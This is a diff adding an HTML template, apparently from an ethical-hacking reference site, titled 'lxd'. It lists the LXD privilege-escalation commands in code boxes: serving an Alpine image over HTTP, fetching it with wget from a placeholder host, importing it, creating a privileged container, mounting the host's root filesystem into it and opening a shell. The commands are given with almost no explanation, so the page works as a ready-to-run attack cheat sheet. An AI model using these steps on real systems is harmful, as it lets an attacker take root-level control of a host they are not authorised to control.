@@ -1,0 +1,31 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'EthHack/css/tools/util.css' %}">
+</head>
+<body>
+    <h1>lxd</h1>
+    <div class="code-box"><pre><code>#Setup HTTP server to host the image
+sudo python -m SimpleHTTPServer 80
+#Download the image remotely using Wget
+wget http://X.X.X.X/alpine-vX.XX-1686-XXXXXXXX_XXXX.tar.gz</code></pre></div>
+
+
+<div class="code-box"><pre><code>lxc image import ./alpine.tar.gz --alias myimage </code></pre></div>
+
+<div class="code-box"><pre><code>lxd init</code></pre></div>
+
+
+<div class="code-box"><pre><code>lxc init myimage mycontainer -c security.privileged=true </code></pre></div>
+
+<div class="code-box"><pre><code>lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true</code></pre></div>
+
+<div class="code-box"><pre><code>lxc start mycontainer
+lxc exec mycontainer /bin/sh</code></pre></div>
+
+</body>
+</html>
